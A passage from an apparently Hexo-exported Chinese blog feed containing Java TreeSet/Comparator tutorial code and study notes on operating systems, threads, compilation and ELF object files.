<h2 id="27-TreeSet使用"><a href="#27-TreeSet使用" class="headerlink" title="27 TreeSet使用"></a>27 TreeSet使用</h2><h3 id="一、String类型"><a href="#一、String类型" class="headerlink" title="一、String类型"></a>一、String类型</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.TreeSet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo4</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 创建集合</span></span><br><span class="line">        TreeSet&lt;String&gt; treeSet = <span class="keyword">new</span> TreeSet&lt;&gt;();</span><br><span class="line">        <span class="comment">// 添加元素</span></span><br><span class="line">        treeSet.add(<span class="string">&quot;baa&quot;</span>);</span><br><span class="line">        treeSet.add(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        treeSet.add(<span class="string">&quot;ccc&quot;</span>);</span><br><span class="line">        System.out.println(treeSet.size());</span><br><span class="line">        System.out.println(treeSet.toString());</span><br><span class="line">        <span class="comment">// 删除元素</span></span><br><span class="line"><span class="comment">//        treeSet.remove(&quot;ccc&quot;);</span></span><br><span class="line"><span class="comment">//        System.out.println(treeSet.toString());</span></span><br><span class="line">        <span class="comment">// foreach</span></span><br><span class="line">        <span class="keyword">for</span> (String s : treeSet) &#123;</span><br><span class="line">            System.out.println(s);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 迭代器</span></span><br><span class="line">        Iterator&lt;String&gt; it = treeSet.iterator();</span><br><span class="line">        <span class="keyword">while</span> (it.hasNext()) &#123;</span><br><span class="line">            System.out.println(it.next());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 判断</span></span><br><span class="line">        System.out.println(treeSet.contains(<span class="string">&quot;aaa&quot;</span>));</span><br><span class="line">        System.out.println(treeSet.isEmpty());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="二、普通类"><a href="#二、普通类" class="headerlink" title="二、普通类"></a>二、普通类</h3><p>当存储的是Person类对象时。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.TreeSet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo5</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        TreeSet&lt;Person&gt; persons = <span class="keyword">new</span> TreeSet&lt;&gt;();</span><br><span class="line">        Person p1 = <span class="keyword">new</span> Person(<span class="string">&quot;人1&quot;</span>,<span class="number">18</span>);</span><br><span class="line">        Person p2 = <span class="keyword">new</span> Person(<span class="string">&quot;人2&quot;</span>,<span class="number">29</span>);</span><br><span class="line">        Person p3 = <span class="keyword">new</span> Person(<span class="string">&quot;人3&quot;</span>,<span class="number">20</span>);</span><br><span class="line">        persons.add(p1);</span><br><span class="line">        persons.add(p2);</span><br><span class="line">        persons.add(p3);</span><br><span class="line">        System.out.println(persons.size());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上述代码就会报错</p>
<p><img src="/2021/12/20/Java%E9%9B%86%E5%90%88%E6%A1%86%E6%9E%B6/image-20211228155936417.png" alt="image-20211228155936417"></p>
<p>原因是：元素对象的类型必须实现<code>Comparable</code>接口，指定排序规则。否则程序无法确定需要比较的是什么。</p>
<p>因此需要改一下Person类。</p>
<p><img src="/2021/12/20/Java%E9%9B%86%E5%90%88%E6%A1%86%E6%9E%B6/image-20211228160345921.png" alt="image-20211228160345921"></p>
<p>然后根据提示，实现<code>CompareTo</code>方法</p>
<p><img src="/2021/12/20/Java%E9%9B%86%E5%90%88%E6%A1%86%E6%9E%B6/image-20211228160416402.png" alt="image-20211228160416402"></p>
<p><img src="/2021/12/20/Java%E9%9B%86%E5%90%88%E6%A1%86%E6%9E%B6/image-20211228160457829.png" alt="image-20211228160457829"></p>
<p>添加逻辑，完善后的<code>CompareTo</code>方法如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compareTo</span><span class="params">(Person o)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n1 = <span class="keyword">this</span>.name.compareTo(o.getName());  <span class="comment">// 比姓名，这里的compareTo方法是字符串自带的方法</span></span><br><span class="line">    <span class="keyword">int</span> n2 = <span class="keyword">this</span>.age - o.getAge();</span><br><span class="line">    <span class="keyword">return</span> n1 == <span class="number">0</span> ? n2 : n1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @author Vict0r</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> chapter3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.TreeSet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo5</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 创建集合</span></span><br><span class="line">        TreeSet&lt;Person&gt; persons = <span class="keyword">new</span> TreeSet&lt;&gt;();</span><br><span class="line">        Person p1 = <span class="keyword">new</span> Person(<span class="string">&quot;人1&quot;</span>,<span class="number">18</span>);</span><br><span class="line">        Person p2 = <span class="keyword">new</span> Person(<span class="string">&quot;人2&quot;</span>,<span class="number">29</span>);</span><br><span class="line">        Person p3 = <span class="keyword">new</span> Person(<span class="string">&quot;人3&quot;</span>,<span class="number">20</span>);</span><br><span class="line">        <span class="comment">// 添加</span></span><br><span class="line">        persons.add(p1);</span><br><span class="line">        persons.add(p2);</span><br><span class="line">        persons.add(p3);</span><br><span class="line">        System.out.println(persons.size());</span><br><span class="line">        System.out.println(persons.toString());</span><br><span class="line">        <span class="comment">// 删除</span></span><br><span class="line"><span class="comment">//        persons.remove(p2);</span></span><br><span class="line"><span class="comment">//        System.out.println(persons.toString());</span></span><br><span class="line">        <span class="comment">// foreach</span></span><br><span class="line">        <span class="keyword">for</span> (Person p : persons) &#123;</span><br><span class="line">            System.out.println(p.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 迭代器</span></span><br><span class="line">        Iterator&lt;Person&gt; it = persons.iterator();</span><br><span class="line">        <span class="keyword">while</span> (it.hasNext()) &#123;</span><br><span class="line">            System.out.println(it.next());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 判断</span></span><br><span class="line">        System.out.println(persons.contains(p1));</span><br><span class="line">        System.out.println(persons.isEmpty());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="28-Comparator接口"><a href="#28-Comparator接口" class="headerlink" title="28 Comparator接口"></a>28 Comparator接口</h2><p>实现定制比较</p>
<p><img src="/2021/12/20/Java%E9%9B%86%E5%90%88%E6%A1%86%E6%9E%B6/image-20211228163123323.png" alt="image-20211228163123323"></p>
<p><img src="/2021/12/20/Java%E9%9B%86%E5%90%88%E6%A1%86%E6%9E%B6/image-20211228163137881.png" alt="image-20211228163137881"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @author Vict0r</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> chapter3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.TreeSet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo6</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 创建集合并指定比较规则</span></span><br><span class="line">        TreeSet&lt;Person&gt; persons = <span class="keyword">new</span> TreeSet&lt;&gt;(<span class="keyword">new</span> Comparator&lt;Person&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(Person o1, Person o2)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">int</span> n1 = o1.getAge() - o2.getAge();</span><br><span class="line">                <span class="keyword">int</span> n2 = o1.getName().compareTo(o2.getName());  <span class="comment">// 比姓名，这里的compareTo方法是字符串自带的方法</span></span><br><span class="line">                <span class="keyword">return</span> n1 == <span class="number">0</span> ? n2 : n1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        Person p1 = <span class="keyword">new</span> Person(<span class="string">&quot;人1&quot;</span>,<span class="number">18</span>);</span><br><span class="line">        Person p2 = <span class="keyword">new</span> Person(<span class="string">&quot;人2&quot;</span>,<span class="number">29</span>);</span><br><span class="line">        Person p3 = <span class="keyword">new</span> Person(<span class="string">&quot;人3&quot;</span>,<span class="number">20</span>);</span><br><span class="line"></span><br><span class="line">        persons.add(p1);</span><br><span class="line">        persons.add(p2);</span><br><span class="line">        persons.add(p3);</span><br><span class="line">        System.out.println(persons.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="29-TreeSet案例"><a href="#29-TreeSet案例" class="headerlink" title="29 TreeSet案例"></a>29 TreeSet案例</h2><p>使用<code>TreeSet</code>实现字符串按长度排序。(首先需要定制<code>Comparable</code>接口)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.TreeSet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo7</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 创建集合并指定规则</span></span><br><span class="line">        TreeSet&lt;String&gt; treeSet = <span class="keyword">new</span> TreeSet&lt;&gt;(<span class="keyword">new</span> Comparator&lt;String&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(String o1, String o2)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">int</span> n1 = o1.length() - o2.length();  <span class="comment">// n1==0则长度一样</span></span><br><span class="line">                <span class="keyword">int</span> n2 = o1.compareTo(o2);</span><br><span class="line">                <span class="keyword">return</span> n1 == <span class="number">0</span> ? n2 : n1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">// 添加数据</span></span><br><span class="line">        treeSet.add(<span class="string">&quot;helloworld&quot;</span>);</span><br><span class="line">        treeSet.add(<span class="string">&quot;pingguo&quot;</span>);</span><br><span class="line">        treeSet.add(<span class="string">&quot;zhangsan&quot;</span>);</span><br><span class="line">        treeSet.add(<span class="string">&quot;lisi&quot;</span>);</span><br><span class="line">        treeSet.add(<span class="string">&quot;cat&quot;</span>);</span><br><span class="line">        treeSet.add(<span class="string">&quot;beijing&quot;</span>);</span><br><span class="line">        treeSet.add(<span class="string">&quot;nanjing&quot;</span>);</span><br><span class="line">        treeSet.add(<span class="string">&quot;xian&quot;</span>);</span><br><span class="line">        System.out.println(treeSet.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="30-Map集合概述"><a href="#30-Map集合概述" class="headerlink" title="30 Map集合概述"></a>30 Map集合概述</h2><h3 id="一、特点-1"><a href="#一、特点-1" class="headerlink" title="一、特点"></a>一、特点</h3><p>（1）存键值对</p>
<p>（2）键值均无序无下标，键不允许重复，值允许重复。</p>
]]></content>
      <categories>
        <category>编程</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>程序员的自我修养[笔记]</title>
    <url>/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/</url>
    <content><![CDATA[<h2 id="第一部分-简介"><a href="#第一部分-简介" class="headerlink" title="第一部分 简介"></a>第一部分 简介</h2><h2 id="第一章-温故而知新"><a href="#第一章-温故而知新" class="headerlink" title="第一章 温故而知新"></a>第一章 温故而知新</h2><h3 id="硬件结构相关"><a href="#硬件结构相关" class="headerlink" title="硬件结构相关"></a>硬件结构相关</h3><ul>
<li><strong>计算机的核心：</strong> CPU，内存，I/O控制芯片</li>
<li><strong>北桥</strong>芯片 （PCI Bridge） 协调高速设备 连接CPU，内存，PCI总线<br><strong>南桥</strong>芯片 （ISA Bridge） 专门处理低速设备，汇总后连接到北桥</li>
</ul>
<h3 id="SMP与多核"><a href="#SMP与多核" class="headerlink" title="SMP与多核"></a>SMP与多核</h3><ul>
<li><strong>对称多处理器</strong>（SMP，Symmetrical Mutil-Processing）： 每个CPU在系统中的地位和功能一样，是相互对称的。理想情况下，速度的提高与CPU数量成正比，但实际上不能。因为不是所有的程序都能分解成若干个完全不相关的子问题。</li>
<li><strong>多核处理器</strong> 实际上就是SMP的简化版</li>
</ul>
<h3 id="计算机软件体系结构"><a href="#计算机软件体系结构" class="headerlink" title="计算机软件体系结构"></a>计算机软件体系结构</h3><p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361932769-448f5299-a31f-4b78-9012-f5f722765353.png" alt><br>接口的上层：使用者<br>接口的下层：提供者</p>
<h3 id="操作系统的功能"><a href="#操作系统的功能" class="headerlink" title="操作系统的功能"></a>操作系统的功能</h3><p>在CSAPP中也有提到，这里更加简练</p>
<ol>
<li>提供抽象的接口</li>
<li>管理硬件资源</li>
</ol>
<h3 id="虚拟地址空间"><a href="#虚拟地址空间" class="headerlink" title="虚拟地址空间"></a>虚拟地址空间</h3><p>简单的内存分配策略存在问题：</p>
<ol>
<li>地址空间不隔离</li>
<li>内存使用效率低</li>
<li>程序运行的地址不确定</li>
</ol>
<p>所以用一种间接的地址访问方法：虚拟地址<br><strong>目的：</strong> 保证程序能访问的物理内存区域与另外的程序不重叠（也即 地址空间隔离）</p>
<h4 id="原始方法：分段"><a href="#原始方法：分段" class="headerlink" title="原始方法：分段"></a>原始方法：分段</h4><p>最开始采用<strong>分段</strong>的方法： 将一段程序所需的内存空间大小的虚拟空间映射到某个地址空间。<br><strong>优点：</strong> 隔离地址空间+确定程序运行的地址<br><strong>缺点：</strong> 没解决内存使用效率低的问题</p>
<h4 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h4><p>方法：将地址空间分为固定大小的页（页大小由操作系统决定）<br>包括：<strong>虚拟页</strong>（VP），<strong>物理页</strong>（PP），<strong>磁盘页</strong>（DP）<br>可以看到下图中，虚拟空间有些页被映射到同一个物理页，这样就可以实现<strong>内存共享</strong><br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361932881-09697135-4f9d-4ac0-babb-4d0fdec20ef4.png" alt><br><strong>页映射：</strong> 采用<strong>MMU</strong> （Memory Management Unit）进行页映射。页映射模式下，CPU发出的是虚拟地址，经过MMU转换后变成物理地址，一般MMU都集成在CPU内部了，不会以独立的部件存在<br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361933139-68ed5853-741c-4c0e-b4c7-e5fbcf3f0eeb.png" alt></p>
<h3 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h3><p><strong>组成：</strong> 线程=线程ID+当前指令指针PC+寄存器集合+堆栈<br>进程内的各个线程之间共享程序的内存空间和一些进程级的资源<br><strong>线程的访问权限</strong><br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361933282-19a1d5b5-cd8e-43f8-b134-7d8000840956.png" alt><br>线程的私有存储空间包括：栈、线程局部存储、寄存器<br><strong>I/O密集型线程：</strong> 频繁等待<br><strong>CPU密集型：</strong> 很少等待</p>
<hr>
<p><strong>抢占</strong>的概念：线程在用尽时间片之后会被强制剥夺继续执行的权利，进入就绪状态，这个过程就是抢占。即之后执行的别的线程抢占了当前线程<br><strong>可抢占线程：</strong> 用尽时间片后被剥夺权利<br><strong>不可抢占线程：</strong> 线程必须手动发出放弃执行的命令或者试图等待某事件，才能让其他线程得到执行</p>
<hr>
<h4 id="Linux的多线程"><a href="#Linux的多线程" class="headerlink" title="Linux的多线程"></a>Linux的多线程</h4><p>Linux将所有的执行实体（无论线程、进程）都成为<strong>任务</strong>（Task），任务在概念上类似于一个单线程的进程。不过Linux下不同的任务之间可以选择共享内存空间，所以实际上，共享了同一个内存空间的多个任务构成了一个进程，这些任务就是这个进程里的线程。</p>
<h5 id="Linux创建新任务的方法"><a href="#Linux创建新任务的方法" class="headerlink" title="Linux创建新任务的方法"></a>Linux创建新任务的方法</h5><p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361933415-967c977e-8e84-4af7-a0be-03ae39b23f30.png" alt><br>fork产生新任务的速度很快，因为并不复制原任务的内存空间，而是和原任务一起共享一个<strong>写时复制</strong> （Copy on Write, COW)<br><strong>写时复制：</strong> 两个任务可同时自由读取内存，当任意一个任务试图修改内存时，内存就会复制一份提供给修改方单独使用，以免影响到其他任务的使用</p>
<hr>
<h4 id="线程安全：同步与锁"><a href="#线程安全：同步与锁" class="headerlink" title="线程安全：同步与锁"></a>线程安全：同步与锁</h4><p>单指令操作（原子操作）不会被打断</p>
<h5 id="同步"><a href="#同步" class="headerlink" title="同步"></a>同步</h5><p>在一个线程访问数据未结束时，其他线程不得访问同一数据，同步最常见的方法就是使用<strong>锁</strong></p>
<h5 id="锁"><a href="#锁" class="headerlink" title="锁"></a>锁</h5><p>是一种非强制机制，每个线程在访问数据前首先试图获取锁，并在访问结束后释放。锁已被占用时，线程会等待其重新可用</p>
<ol>
<li><strong>二元信号量：</strong> 延申：（多元）信号量</li>
<li><strong>互斥量：</strong> 信号量可以被一个线程获取再由其他线程释放，但互斥量要求释放者必须是获取者</li>
<li><strong>临界区：</strong> 比互斥量更严格，对于一个进程创建的互斥量和信号量，另一个进程去获取该锁也是合法的。而<strong>临界区将作用范围限制在本进程</strong>。</li>
<li><strong>读写锁：</strong> 有两种获取：共享方式和独占方式<br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361933549-a64ddad4-f491-4b9c-a59a-b9d52654c161.png" alt></li>
</ol>
<h4 id="三种线程模型"><a href="#三种线程模型" class="headerlink" title="三种线程模型"></a>三种线程模型</h4><h5 id="一对一模型"><a href="#一对一模型" class="headerlink" title="一对一模型"></a>一对一模型</h5><p>一个用户使用的线程就唯一对应一个内核使用的线程（反过来就不一定，因为一个内核里的线程在用户态不一定有对应的线程存在）<br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361933679-90de8953-42eb-4e83-bc03-800ec82211ac.png" alt><br><strong>优点：</strong> 一个线程阻塞，其他线程不受影响<br><strong>缺点：</strong></p>
<ol>
<li>许多操作系统限制了内核线程的数量，一对一线程使用户线程数量也受到限制</li>
<li>许多操作系统内核线程调度时，上下文切换的开销大，导致用户线程执行效率下降</li>
</ol>
<h5 id="多对一模型"><a href="#多对一模型" class="headerlink" title="多对一模型"></a>多对一模型</h5><p>多个用户线程映射到一个内核线程，线程之间的切换由用户态的代码进行<br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361933813-344456d6-3991-4539-8040-06ca9350c26d.png" alt><br><strong>优点：</strong></p>
<ol>
<li>上下文切换更高效</li>
<li>线程数量几乎无限制<br><strong>缺点：</strong> 一个用户线程阻塞，其他所有线程都无法执行</li>
</ol>
<h5 id="多对多模型"><a href="#多对多模型" class="headerlink" title="多对多模型"></a>多对多模型</h5><p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361933923-eb2b4c5c-9e38-41cc-bfe9-865ee8a67a49.png" alt><br><strong>优点：</strong></p>
<ol>
<li>一个用户线程阻塞不会使所有用户线程阻塞</li>
<li>用户线程数量也没什么限制</li>
</ol>
<h2 id="第二部分-静态链接"><a href="#第二部分-静态链接" class="headerlink" title="第二部分 静态链接"></a>第二部分 静态链接</h2><h2 id="第二章-编译和链接"><a href="#第二章-编译和链接" class="headerlink" title="第二章 编译和链接"></a>第二章 编译和链接</h2><p><strong>构建：</strong> 编译和链接合并到一起的过程</p>
<h3 id="被隐藏的过程"><a href="#被隐藏的过程" class="headerlink" title="被隐藏的过程"></a>被隐藏的过程</h3><p>又是熟悉的代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;Hello, world\n&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h4><p><strong>说明：</strong> 对于C程序，会被预编译成.i文件；对于C++程序，预编译成.ii文件<br><strong>命令：</strong> 对于hello.c文件<br><code>gcc -E hello.c -o hello.i</code><br>或者<code>cpp hello.c &gt; hello.i</code></p>
<hr>
<p><strong>处理规则：</strong></p>
<ol>
<li>删除所有<code>#define</code>并展开所有宏定义</li>
<li>处理所有条件预编译指令，如<code>#if</code> <code>#ifdef</code> <code>#elif</code> <code>#else</code> <code>#endif</code></li>
<li>递归处理<code>#include</code></li>
<li>删除所有注释</li>
<li>添加行号、文件标识符</li>
<li>保留所有<code>#pragma</code>编译器指令</li>
</ol>
<p>经过预编译后的.i文件不包含任何宏定义，因为所有宏定义都被展开，并且包含的文件也被插入到.i文件。<br>所以当无法判断宏定义是否正确或者头文件包含是否正确时，可查看预编译后的文件确定问题。</p>
<h4 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h4><p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361934062-eab80846-a499-4ba1-9543-4bc68a8ecae2.png" alt><br><strong>过程说明：</strong> 扫描、语法分析、语义分析、源代码优化、代码生成、目标代码优化<br><strong>命令：</strong><br><code>gcc -S hello.i -o hello.s</code><br>或者<code>gcc -S hello.c -o hello.s</code></p>
<ol>
<li><strong>词法分析：</strong> 首先源代码程序被输入到<strong>扫描器</strong>，运用一种类似<strong>有限状态机</strong>的算法将源代码的字符序列分割成一系列<strong>记号</strong>。</li>
<li><strong>语法分析：</strong> 采用<strong>上下文无关语法</strong>对记号进行语法分析，生成以<strong>表达式</strong>为节点的<strong>语法树</strong>。</li>
<li><strong>语义分析：</strong> 生成标识语义的语法树。编译器能分析的是<strong>静态语义</strong>，在编译期间可以确定（比如将浮点型赋值给一个指针）；<strong>动态语义</strong>只有在运行期间才能确定。（比如0作为除数）</li>
<li><strong>中间语言生成：</strong> 直接在语法树上优化比较困难，所以<strong>源代码优化器</strong>（Source Code Optimizer）往往将整个语法树转换成<strong>中间代码</strong>。它是语法树的顺序表示，非常接近目标代码。</li>
</ol>
<hr>
<p>中间代码使编译器可分为前后端。前端负责产生机器无关的中间代码，后端将中间代码转换成目标机器代码</p>
<hr>
<ol>
<li><strong>目标代码生成与优化：</strong> 代码生成器依赖目标机器将中间代码转成目标机器代码，代码优化器负责对目标机器代码进行优化（如选择合适的寻址方式）</li>
</ol>
<h4 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h4><p><strong>说明：</strong> 根据汇编指令和机器指令的对照表一一翻译<br><strong>命令：</strong><br><code>as hello.s -o hello.o</code><br>或者<code>gcc -c hello.s -o hello.o</code><br>或者<code>gcc -c hello.c -o hello.o</code></p>
<h4 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h4><p><strong>C/C++模块之间通信方式：</strong></p>
<ol>
<li>模块间的函数调用</li>
<li>模块间的变量访问</li>
</ol>
<p>这两种方式可以归结为一种：模块间符号的引用。而模块的拼接过程就是<strong>链接</strong><br><strong>过程：</strong> 地址和空间分配、符号决议（确保所有目标文件中的符号引用都有唯一的定义）、重定位<br>最基本的静态链接过程：每个模块的源码文件.c经过编译器编译成目标文件.o，目标文件和库（最常见的是运行时库Runtime Library）一起链接成可执行文件</p>
<h2 id="第三章-目标文件里有什么"><a href="#第三章-目标文件里有什么" class="headerlink" title="第三章 目标文件里有什么"></a>第三章 目标文件里有什么</h2><h3 id="目标文件的格式"><a href="#目标文件的格式" class="headerlink" title="目标文件的格式"></a>目标文件的格式</h3><p>PE和ELF都是COFF的变种，COFF的主要贡献：在目标文件中引入<strong>段</strong>机制+定义了调试数据的格式。<br>按照可执行文件存储的文件有：可执行文件、动态链接库（如Windows的DLL和Linux的so）、静态链接库（如Windows的.lib和Linux的.a）<br>ELF文件标准里，将系统中采用<strong>ELF格式的文件归为4类</strong><br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361934168-d5e52dc5-09e4-4a8c-bb78-1e6eb5ca20a2.png" alt><br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361934284-bb0c00e5-e754-49a0-80f9-c89b6d86ced2.png" alt></p>
<h3 id="目标文件是什么样的"><a href="#目标文件是什么样的" class="headerlink" title="目标文件是什么样的"></a>目标文件是什么样的</h3><p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361934397-f9cf89c8-022e-42f2-987f-ed465ad5995c.png" alt></p>
<h4 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h4><ol>
<li>源代码编译后的机器指令存放在<strong>代码段</strong>.text或者.code</li>
<li>初始化的全局变量或局部静态变量存放在<strong>数据段</strong>.data</li>
<li>未初始化的变量存放在<strong>BSS段</strong>，准确地说是.bss段为它们预留了空间。（注意：初始化为0的可以被认为是未初始化的，被优化掉放在.bss可以节省磁盘空间，因为.bss不占磁盘空间）</li>
<li>除了以上三个基本的段以外，还有只读数据段.rodata，注释信息段.comment，堆栈提示段.note.GNU-stack</li>
</ol>
<h4 id="指令操作"><a href="#指令操作" class="headerlink" title="指令操作"></a>指令操作</h4><ol>
<li><code>gcc -c simple.c</code> -c表示只编译，不链接</li>
<li><code>objdump -h simple.o</code> objdump查看目标文件结构及内容，-h就是把ELF文件的各个段基本信息打印出来，-x可以打印更多的信息<br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361934488-4d116190-0e4d-4177-8549-ec7997cde685.png" alt></li>
<li><code>size simple.o</code> 可以查看ELF文件代码段、数据段、BSS段的长度</li>
<li><code>objdump -s -d simple.o</code> -s可以将所有段的内容以16进制打印，-d将所有包含指令的段反汇编<br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361934910-06004ed7-42cd-4be1-ab8c-ce11aaa9b94e.png" alt></li>
</ol>
<h4 id="其他段"><a href="#其他段" class="headerlink" title="其他段"></a>其他段</h4><p><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361935005-47fe9f8d-90f4-4084-9189-108b3e8cf899.png" alt></p>
<h3 id="ELF文件结构"><a href="#ELF文件结构" class="headerlink" title="ELF文件结构"></a>ELF文件结构</h3><p>还是这张图<br><img src="/2021/03/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/1618361935175-fedde66c-df06-42e9-82fa-38b213dfbe43.png" alt></p>
